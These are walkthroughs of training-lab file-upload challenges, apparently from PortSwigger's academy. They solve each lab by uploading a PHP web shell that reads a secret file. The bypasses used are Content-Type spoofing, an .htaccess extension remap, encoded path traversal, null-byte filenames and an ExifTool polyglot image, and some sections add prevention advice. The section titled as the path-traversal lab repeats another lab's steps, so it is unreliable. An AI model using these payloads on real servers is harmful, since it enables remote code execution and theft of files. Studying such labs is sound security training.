----
# **Lab 1: Remote code execution via web shell upload**

## **Aim** - To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret

### Your credentials -
```
wiener:peter
```
**1. Logging In and Observing the Avatar Upload Functionality**

 - While proxying traffic through Burp Suite, I logged into my account on the target website.
 - On the account page, I noticed an option to upload an avatar image.
 - I uploaded a random image (e.g., test.jpg) and observed that a preview of the avatar appeared on my account page.

**2. Identifying the Avatar Fetch Request**
 - In Burp Suite, I navigated to Proxy > HTTP history to examine the traffic.
 - I used the filter bar to filter requests by MIME type:
 - Opened the filter window.
 - Enabled the Images checkbox.
 - Applied the changes.
 - In the filtered HTTP history, I found a GET request that fetched the uploaded avatar using this pattern:
 - GET /files/avatars/<YOUR-IMAGE>
 - I sent this request to Burp Repeater for further testing.

**3. Preparing the Exploit File**
 - On my local system, I created a file named exploit.php containing the following malicious PHP script:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
 - This script attempts to read the contents of Carlos's secret file located at /home/carlos/secret.
![Screenshot from 2025-01-18 21-40-24](https://github.com/user-attachments/assets/d8e3b9cb-3119-43a1-976d-48e70539b40a)

**4. Uploading the Malicious PHP File**
 - I returned to the avatar upload functionality on the website and uploaded my exploit.php file as the avatar.
 - The server responded with a confirmation message indicating that the file was successfully uploaded.

**5. Executing the Exploit**
 - In Burp Repeater, I modified the path in the previously captured GET request to point to my malicious PHP file:
```
GET /files/avatars/exploit.php HTTP/1.1
```
 - I sent the request. The server executed the PHP script and returned its output, which contained Carlos's secret.
![Screenshot from 2025-01-18 21-40-00](https://github.com/user-attachments/assets/ce5aa692-12f8-4e5c-b881-92dcf391933a)

**6. Submitting the Secret**
 - I copied Carlos's secret from the response and submitted it to complete the lab.
![Screenshot from 2025-01-18 21-39-52](https://github.com/user-attachments/assets/dadf1ed3-717c-4f60-bf3e-e6a1e28347ad)

----
----
# **Lab 2: Web shell upload via Content-Type restriction bypass**

**Step 1: Analyze the Avatar Upload Functionality**
 - Log in to your account on the target application.
 - Navigate to the avatar upload feature and upload an arbitrary image (e.g., image.jpg) as your avatar.
 - After uploading, return to your account page. Notice that the uploaded image is displayed as a preview.

**Step 2: Intercept the Image Fetch Request**
 - Open Burp Suite and go to Proxy > HTTP history.
 - Locate the GET request used to fetch your avatar image at the path /files/avatars/<YOUR-IMAGE>.
 - Send this request to Burp Repeater for later use.

**Step 3: Create the Exploit Script**
 - On your local machine, create a PHP script named exploit.php with the following contents:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
 - This script reads the sensitive file /home/carlos/secret and outputs its contents.

**Step 4: Attempt to Upload the Exploit Script**
 - Use the avatar upload functionality to attempt uploading exploit.php as your avatar.
 - Observe that the server rejects the upload, stating that only files with the MIME type image/jpeg or image/png are allowed.
![Screenshot from 2025-01-18 22-30-10](https://github.com/user-attachments/assets/b14e25c1-a93a-43c8-872e-7fab2f275fe4)

**Step 5: Modify the File Upload Request**
 - Go to Proxy > HTTP history in Burp Suite.
 - Find the POST /my-account/avatar request responsible for submitting the avatar upload.
 - Send this request to Burp Repeater.
 - In Burp Repeater, locate the section in the request body that specifies the Content-Type for the uploaded file. Change it from:
```
Content-Type: application/x-php
to:
Content-Type: image/jpeg
```
 - Send the modified request.
 - Observe that the server responds, confirming the file upload was successful.
![Screenshot from 2025-01-18 22-30-22](https://github.com/user-attachments/assets/97ecf973-1de0-49b9-8879-b9249b73e2df)

**Step 6: Execute the Malicious Script**
 - Switch to the GET /files/avatars/<YOUR-IMAGE> request in Burp Repeater.
 - Replace the file name in the path with exploit.php:
```
GET /files/avatars/exploit.php HTTP/1.1
```
 - Send the request.
 - Observe that the server executes the script and returns the contents of Carlos's secret file in the response.
![Screenshot from 2025-01-18 22-29-20](https://github.com/user-attachments/assets/061bfe10-33cc-4044-a40f-f2cc64c55a18)

**Step 7: Submit the Secret**
 - Copy the secret returned in the response.
 - Submit it to the lab to complete the challenge.
![Screenshot from 2025-01-18 22-29-45](https://github.com/user-attachments/assets/0b6aaa40-6479-494e-b1e1-a34a43ae07a3)
----
----
# **Lab 3: Web shell upload via path traversal**

**Step 1: Analyze the Avatar Upload Functionality**
 - Log in to your account on the target application.
 - Navigate to the avatar upload feature and upload an arbitrary image (e.g., image.jpg) as your avatar.
 - After uploading, return to your account page. Notice that the uploaded image is displayed as a preview.

**Step 2: Intercept the Image Fetch Request**
 - Open Burp Suite and go to Proxy > HTTP history.
 - Locate the GET request used to fetch your avatar image at the path /files/avatars/<YOUR-IMAGE>.
 - Send this request to Burp Repeater for later use.

**Step 3: Create the Exploit Script**
 - On your local machine, create a PHP script named exploit.php with the following contents:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
 - This script reads the sensitive file /home/carlos/secret and outputs its contents.

**Step 4: Attempt to Upload the Exploit Script**
 - Use the avatar upload functionality to attempt uploading exploit.php as your avatar.
 - Observe that the server rejects the upload, stating that only files with the MIME type image/jpeg or image/png are allowed.

**Step 5: Modify the File Upload Request**
 - Go to Proxy > HTTP history in Burp Suite.
 - Find the POST /my-account/avatar request responsible for submitting the avatar upload.
 - Send this request to Burp Repeater.
 - In Burp Repeater, locate the section in the request body that specifies the Content-Type for the uploaded file. Change it from:
```
Content-Type: application/x-php
to:
Content-Type: image/jpeg
```
 - Send the modified request.
 - Observe that the server responds, confirming the file upload was successful.

**Step 6: Execute the Malicious Script**
 - Switch to the GET /files/avatars/<YOUR-IMAGE> request in Burp Repeater.
 - Replace the file name in the path with exploit.php:
```
GET /files/avatars/exploit.php HTTP/1.1
```
 - Send the request.
 - Observe that the server executes the script and returns the contents of Carlos's secret file in the response.

**Step 7: Submit the Secret**
 - Copy the secret returned in the response.
 - Submit it to the lab to complete the challenge.
```
Btb8vzFNtwLrmvb1FFAe7uybK8EVS2T**
```
----
----
# LAB 4: Web shell upload via extension blacklist bypass

**Step 1: Uploading an Image as Avatar**
 - Log in to the web application and upload an image as your avatar.
 - Navigate to your account page and observe that the image is fetched using a GET request to:
```
GET /files/avatars/<YOUR-IMAGE>
```
 - Send this request to Burp Suite's Repeater for further analysis.

**Step 2: Preparing the PHP Exploit**
 - Create a malicious PHP script (exploit.php) with the following payload to read Carlos's secret file:
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
 - Attempt to upload the PHP file as an avatar, but the server rejects the request because it does not allow .php extensions.

**Step 3: Identifying Server Type**
 - In Burp Suite, find the POST /my-account/avatar request in the Proxy > HTTP history tab.
 - Observe the server response headers, which indicate that the application is running on an Apache server.

**Step 4: Uploading a Malicious .htaccess File**
 - Since Apache allows per-directory configuration using .htaccess files, we can leverage this feature to override the file execution settings.

**Modify the upload request as follows:**
 - Change the filename from exploit.php to .htaccess.
 - Set the Content-Type to text/plain (to prevent rejection by the server).
 - Replace the file content with the following Apache directive:
```
AddType application/x-httpd-php .l33t
```
 - This directive maps files with the .l33t extension to be executed as PHP scripts by the server.

 - Send the modified upload request and verify that the .htaccess file is successfully uploaded.
![Screenshot from 2025-01-20 10-11-46](https://github.com/user-attachments/assets/54ccc1b8-ffef-4ba2-b457-af54996776b2)

**Step 5: Uploading the PHP Payload with a Different Extension**
 - Return to the original avatar upload request in Burp Repeater.
 - Modify the filename parameter from exploit.php to exploit.l33t (leveraging the previously uploaded .htaccess configuration).
 - Send the request and confirm that the upload succeeds.
![Screenshot from 2025-01-20 10-11-38](https://github.com/user-attachments/assets/510e1ebf-44b6-4960-9577-3391ec5bb528)

**Step 6: Executing the PHP Exploit**
 - In Burp Repeater, return to the GET /files/avatars/<YOUR-IMAGE> request.
 - Replace the image filename with exploit.l33t and send the request:
```
GET /files/avatars/exploit.l33t
```
 - The server processes the .l33t file as PHP (due to the .htaccess override), and Carlos's secret is displayed in the response.
 - Submit the secret to solve the lab.
![Screenshot from 2025-01-20 10-11-31](https://github.com/user-attachments/assets/45508008-a479-40dd-85e3-7365d65e3328)

![Screenshot from 2025-01-20 10-11-17](https://github.com/user-attachments/assets/d6892c42-ec79-46cc-8d65-f5f4d2e7aaaf)

----
## Explanation of Apache Configuration Files and .htaccess
**1. What is .htaccess?**
 - .htaccess is a configuration file used by Apache web servers to override settings on a per-directory basis.
 - It allows web administrators to modify configurations without changing the global Apache configuration (apache2.conf or httpd.conf).
 - Common uses include:
  - URL rewriting (mod_rewrite)
  - Access control (password protection)
 - Custom error pages
File MIME type mappings (exploited in this attack)

**2. How the Attack Works**
 - Default Server Behavior:
    - By default, Apache servers only execute files with predefined extensions (e.g., .php) and serve others as static content.
 - Abusing .htaccess: By uploading a custom .htaccess file, attackers can redefine which file extensions should be treated as PHP scripts.
 - The AddType Directive:
  - AddType application/x-httpd-php .l33t tells Apache to treat .l33t files as PHP scripts.
  - When the attacker uploads and accesses exploit.l33t, the server processes it as PHP.

**3. Why This Works**
 - Apache applies .htaccess configurations dynamically for each directory where it's placed.
 - The web application may lack proper validation and sanitization, allowing attackers to:
 - Upload unexpected file types (e.g., .htaccess).
 - Bypass extension filters using alternative mapped extensions (.l33t).
 - Developers may overlook the risks of directory-specific configurations.

**4. Prevention Measures**
 - To prevent such attacks, web developers should:
 - Restrict file upload types securely:
  - Use a whitelist of allowed file extensions.
  - Validate MIME types properly on both client and server sides.
 - Disable .htaccess overrides:
  - In Apache's main configuration (apache2.conf), set:
```
AllowOverride None
```
 - Set strict directory permissions:
 - Ensure the web application cannot write to sensitive directories.

**5. Monitor for suspicious uploads:**
 - Regularly scan uploaded files for potentially malicious content.

----
# **Exploiting File Upload to Read a Secret File**  

1. **Upload an Image as an Avatar**
   - Log in and go to your account page.  
   - Upload an image as your avatar.  

3. **Find the Image Request in Burp**  
   - Open Burp and go to **Proxy > HTTP history**.  
   - Look for a **GET request** to `/files/avatars/<YOUR-IMAGE>`.  
   - Send this request to **Burp Repeater**.  

4. **Create and Upload a Malicious PHP File**  
   - On your system, create a file called `exploit.php` with the following script:  
     ```php
     <?php echo file_get_contents('/home/carlos/secret'); ?>
     ```  
   - Upload this file as your avatar.  
   - Notice that the website does not block PHP file uploads.  

5. **Test If the PHP File Executes**  
   - In **Burp Repeater**, find the **GET request** to `/files/avatars/<YOUR-IMAGE>`.  
   - Replace `<YOUR-IMAGE>` with `exploit.php` and send the request.  
   - The server **does not execute** the PHP file but returns its plain text content.  

6. **Modify the File Upload Request**  
   - In **Burp Proxy history**, find the **POST /my-account/avatar** request.  
   - Send it to **Burp Repeater**.  
   - In the request body, locate the `Content-Disposition` header for your PHP file and modify the filename:  
     ```
     filename="../exploit.php"
     ```  
   - Send the request. The response indicates that the file was saved as `avatars/exploit.php`, meaning directory traversal was stripped.  

7. **Bypass Directory Traversal Filtering**  
   - Instead of `../`, use its URL-encoded version `%2f`:  
     ```
     filename="..%2fexploit.php"
     ```  
   - Send the request again. The response now states that the file was uploaded as `avatars/../exploit.php`, indicating successful traversal.  
![Screenshot from 2025-01-19 10-02-10](https://github.com/user-attachments/assets/28edb35b-8f5f-4490-a02b-5e24068c880e)

8. **Retrieve Carlos’s Secret**  
   - In **Burp Proxy history**, find the **GET /files/avatars/..%2fexploit.php** request.  
   - Observe that Carlos’s secret is returned in the response.  
   - This confirms that the file was uploaded outside the avatars folder and was executed by the server.  

9. **Submit the Secret to Solve the Lab**  
   - Copy the secret and submit it to complete the challenge.
![Screenshot from 2025-01-19 10-01-47](https://github.com/user-attachments/assets/bdd39f6a-7243-42d5-ab66-895d1cdf37e2)

![Screenshot from 2025-01-19 10-01-39](https://github.com/user-attachments/assets/c7fde2a8-0167-4022-851f-5f2a0db4a1d9)

----


Steps to Exploit

Step 1: Upload an Image as Avatar

Log in to the web application and upload a valid image (JPG or PNG) as your avatar.

Navigate to your account page and observe the image being loaded using a GET request:

GET /files/avatars/<YOUR-IMAGE>

Send this request to Burp Suite's Repeater for further use.

Step 2: Preparing the PHP Exploit

On your local system, create a malicious PHP script named exploit.php with the following content:

<?php echo file_get_contents('/home/carlos/secret'); ?>

Attempt to upload exploit.php as your avatar. The server responds with an error message stating that only JPG and PNG file types are allowed.

Step 3: Modifying the File Upload Request

In Burp's Proxy > HTTP history, locate the POST /my-account/avatar request used to upload the file.

Send the request to Burp Repeater for further modification.

In the request body, locate the Content-Disposition header that specifies the filename parameter.

Modify the filename parameter to include a URL-encoded null byte (%00), followed by the .jpg extension:

filename="exploit.php%00.jpg"

Send the modified request and observe that the server successfully uploads the file.

The response indicates that the file is stored as exploit.php, suggesting that the null byte and .jpg extension were stripped by the server.

Step 4: Executing the Exploit

Switch to the Repeater tab containing the original GET /files/avatars/<YOUR-IMAGE> request.

Replace the image filename with exploit.php and send the request:

GET /files/avatars/exploit.php

Observe that Carlos's secret is successfully returned in the response.

Submit the secret to solve the lab.

Explanation of the Vulnerability

1. Null Byte Injection

The null byte (%00) is an ASCII character that serves as a string terminator in many programming languages like C and PHP.

When the server processes the file upload, it may treat the filename up to the null byte (exploit.php) and ignore the appended .jpg extension.

As a result, the server stores the file with its intended extension (.php), allowing it to execute as PHP code.

2. Why the Attack Works

The server-side validation likely checks the file extension after the null byte (.jpg) and considers it valid.

However, the underlying file system or web server processes the filename up to the null byte (exploit.php), resulting in execution.

Prevention Measures

To prevent such attacks, developers should:

Implement strict server-side validation:

Validate filenames after decoding any special characters (e.g., null bytes).

Use allowlists for permitted file types instead of relying on extensions.

Sanitize user input:

Remove null bytes and other special characters from filenames.

Enforce MIME type checking:

Inspect the actual content of the uploaded file rather than relying on its extension.

Configure server security policies:

Use web server configurations to prevent execution of uploaded files in the upload directory.


On your system, create a file called exploit.php containing a script for fetching the contents of Carlos's secret. For example:

<?php echo file_get_contents('/home/carlos/secret'); ?>
Log in and attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.
Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:

exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
This adds your PHP payload to the image's Comment field, then saves the image with a .php extension.

In the browser, upload the polyglot image as your avatar, then go back to your account page.
In Burp's proxy history, find the GET /files/avatars/polyglot.php request. Use the message editor's search feature to find the START string somewhere within the binary image data in the response. Between this and the END string, you should see Carlos's secret, for example:

START 4feagvGA9O6WAUvESo29o4k3UfPIvGJK END
Submit the secret to solve the lab.
